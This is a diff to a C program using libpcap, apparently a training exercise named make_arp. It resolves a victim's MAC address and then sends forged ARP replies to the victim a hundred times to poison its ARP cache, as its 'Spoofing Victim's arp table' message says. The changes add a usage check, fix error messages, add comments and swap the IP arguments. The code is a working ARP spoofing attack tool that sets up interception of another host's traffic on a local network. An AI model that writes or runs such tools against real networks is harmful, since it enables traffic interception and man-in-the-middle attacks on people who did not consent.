@@ -89,10 +89,8 @@ int main(int argc, char **argv) {
     pcap_if_t *alldevs;
     eth_header eth;
     arp_header arp;
-    unsigned int optype = 0;
 
-    int length = 0, no=0;
-    int i=0;
+    int length = 0;
     uint8_t myIP[4];
     uint8_t myMAC[6];
     uint8_t victimMAC[6];
@@ -102,12 +100,17 @@ int main(int argc, char **argv) {
     const u_char* pack;
 
 
+    if(argc != 4){
+        printf("Usage : ./make_arp <device> <sender_ip> <victim_ip>\n");
+        exit(0);
+    }
+
     if ((fp = pcap_open_live(argv[1], 65535, 0, 1000, errbuf)) == NULL) {
-        fprintf(stderr, "unable to open adapter\n", errbuf);
+        fprintf(stderr, "Unable to open adapter : %s\n", errbuf);
         exit(1);
     }
 
-    memset(packet, 0, sizeof(packet));
+    memset(packet, 0, sizeof(packet));      //initialize packet
 
 
 
@@ -122,21 +125,6 @@ int main(int argc, char **argv) {
     for(pcap_if_t *d=alldevs; d!=NULL; d=d->next)
     {
         if(strcmp(d->name, argv[1]) == 0){
-          /*  for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next)
-            {
-
-
-
-                    if(a->addr->sa_family == AF_INET)
-                    {
-                        printf("1234");
-                        i=1;
-                        printf("%s\n",inet_ntoa((reinterpret_cast<struct sockaddr_in*>(a->addr))->sin_addr));
-
-                    }
-                    break;
-
-                }*/
             for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next)
              {
                     if(a->addr->sa_family == AF_INET)
@@ -151,17 +139,17 @@ int main(int argc, char **argv) {
 
     get_my_MAC(myMAC);
 
-    memcpy(eth.srcMac, myMAC, 6);
-    memcpy(eth.destMac, "\xFF\xFF\xFF\xFF\xFF\xFF",6);
+    memcpy(eth.srcMac, myMAC, 6);           //src : me
+    memcpy(eth.destMac, "\xFF\xFF\xFF\xFF\xFF\xFF",6);  //dest : broadcast
     eth.type = htons(0x0806);	//arp
 
-    arp.hardware_type = htons(1);
-    arp.protocol_type = htons(0x0800);
-    arp.hardware_addr_len = 6;
-    arp.protocol_addr_len = 4;
+    arp.hardware_type = htons(1);       // hardware_type 1 : Ethernet
+    arp.protocol_type = htons(0x0800);  // protocol_type 0x0800 : IPv4
+    arp.hardware_addr_len = 6;          // MAC len = 6
+    arp.protocol_addr_len = 4;             // IP len =4
 
 
-    arp.operation=htons(1);
+    arp.operation=htons(1);             //opcode = 1: request
 
     memcpy(arp.Sender_Mac, myMAC,6);
     memcpy(arp.Target_Mac, "\x00\x00\x00\x00\x00\x00",6);
@@ -169,7 +157,7 @@ int main(int argc, char **argv) {
 
     memcpy(arp.Sender_Ip, myIP, 4);
 
-    sscanf(argv[2],"%u.%u.%u.%u",&arp.Target_Ip[0],&arp.Target_Ip[1],&arp.Target_Ip[2],&arp.Target_Ip[3]);
+    sscanf(argv[3],"%u.%u.%u.%u",&arp.Target_Ip[0],&arp.Target_Ip[1],&arp.Target_Ip[2],&arp.Target_Ip[3]);  //get ip from argv
 
     memcpy(packet, &eth, sizeof(eth));
     length += sizeof(eth);
@@ -180,27 +168,29 @@ int main(int argc, char **argv) {
 
 
     if ((pcap_sendpacket(fp, packet, length)) != 0) {
-        fprintf(stderr, "\nError sending packet\n", pcap_geterr(fp));
+        fprintf(stderr, "\nError sending packet : %s\n", pcap_geterr(fp));
     }else{
         printf("Getting Victim MAC\n");
     }
-    memset(packet, 0, sizeof(packet));
+
+
+    memset(packet, 0, sizeof(packet));      //initialize packet
     length=0;
     while(true){
         int res = pcap_next_ex(fp, &header, &pack);
         if(res == 0)continue;
         if (res == -1 || res == -2) break;
         if(isPacketMine(pack,myMAC) == 1){
-
             if(pack[12] == 0x08 && pack[13] == 0x06){
                 if(pack[20] == 0x00 && pack[21] ==0x02){
-                    memcpy(victimMAC, pack+22,6);
+                    memcpy(victimMAC, pack+22,6);               //get victim MAC addr
                     break;
                 }
 
             }
         }
     }
+
     printf("my MAC: ");
     for(int j = 0 ; j < 6 ; j++){
         printf("%02x ",myMAC[j]);
@@ -212,33 +202,36 @@ int main(int argc, char **argv) {
     }
     printf("\n");
 
+
+
     memcpy(eth.srcMac, myMAC, 6);
-    memcpy(eth.destMac, victimMAC,6);
+    memcpy(eth.destMac, victimMAC,6);   //dest : victim
     eth.type = htons(0x0806);	//arp
 
     arp.hardware_type = htons(1);
     arp.protocol_type = htons(0x0800);
     arp.hardware_addr_len = 6;
     arp.protocol_addr_len = 4;
-    arp.operation=htons(2);
+    arp.operation=htons(2);     //opcode=2 : response
 
     memcpy(arp.Sender_Mac, myMAC,6);
     memcpy(arp.Target_Mac, victimMAC, 6);
 
-    sscanf(argv[3],"%u.%u.%u.%u",&arp.Sender_Ip[0],&arp.Sender_Ip[1],&arp.Sender_Ip[2],&arp.Sender_Ip[3]);
-    sscanf(argv[2],"%u.%u.%u.%u",&arp.Target_Ip[0],&arp.Target_Ip[1],&arp.Target_Ip[2],&arp.Target_Ip[3]);
+    sscanf(argv[2],"%u.%u.%u.%u",&arp.Sender_Ip[0],&arp.Sender_Ip[1],&arp.Sender_Ip[2],&arp.Sender_Ip[3]);
+    sscanf(argv[3],"%u.%u.%u.%u",&arp.Target_Ip[0],&arp.Target_Ip[1],&arp.Target_Ip[2],&arp.Target_Ip[3]);
     memcpy(packet, &eth, sizeof(eth));
     length += sizeof(eth);
     memcpy(packet+length, &arp, sizeof(arp));
     length += sizeof(arp);
-    printf("Spoofing Victim arp table\n");
+
+    printf("Spoofing Victim's arp table...");
+
     for(int j = 0 ; j < 100; j++){
         sleep(1);
         if ((pcap_sendpacket(fp, packet, length)) != 0) {
-            fprintf(stderr, "\nError sending packet\n", pcap_geterr(fp));
-        }else{
-            printf(".");
+            fprintf(stderr, "\nError sending packet: %s\n", pcap_geterr(fp));
         }
+
     }
 
     printf("Done");
